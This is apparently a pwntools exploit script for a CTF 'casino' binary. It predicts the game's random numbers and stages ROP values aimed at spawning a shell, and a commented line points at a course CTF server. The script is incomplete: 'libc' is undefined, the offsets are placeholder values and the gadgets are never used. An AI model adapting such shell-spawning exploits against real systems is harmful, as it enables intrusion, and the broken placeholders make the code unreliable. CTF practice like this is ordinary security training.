# Please run with python2.7 for better compatibility
from pwn import *

context.clear(arch='x86_64')

# name
name = '\x00' * 20

# random number
p = process("./gen_num.out")
numbers = p.recvall().decode().split('\n')
del numbers[-1]
p.close()

# calculate offset for system library
# ROP gadgets
system_offset = 123
system_func_ptr = libc + system_offset
bin_sh = libc + 123
ret = 0x4006b6

# send
r = process("./casino")
# elf = ELF("./casino")
# r = remote('edu-ctf.csie.org', 10172)
r.sendlineafter('name: ', name)
r.sendlineafter('age: ', '40')

for cnt_try in range(0, 2):
    cnt_num = 0
    if cnt_try == 1:
        for i in numbers:
            r_out = 'Chose the number ' + str(cnt_num) + ': '
            r.sendlineafter(r_out, str(i))
            cnt_num += 1
    elif cnt_try == 0:
        for i in range(0, 6):
            r_out = 'Chose the number ' + str(cnt_num) + ': '
            r.sendlineafter(r_out, str(i))
            cnt_num += 1
    # pause()
    r.sendlineafter('0:no]:', '0')

r.interactive()
r.close()
